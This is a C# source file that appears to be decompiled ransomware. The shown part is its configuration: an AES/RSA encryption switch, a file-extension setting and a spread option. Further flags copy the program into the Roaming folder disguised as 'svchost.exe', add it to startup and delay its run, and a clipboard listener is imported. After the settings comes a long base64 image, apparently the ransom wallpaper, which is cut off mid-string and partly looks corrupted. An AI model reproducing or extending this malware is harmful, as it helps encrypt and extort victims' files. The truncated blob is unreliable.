using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = false;

	private static string spreadName = "surprise";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 10;

	private static string base64Image = "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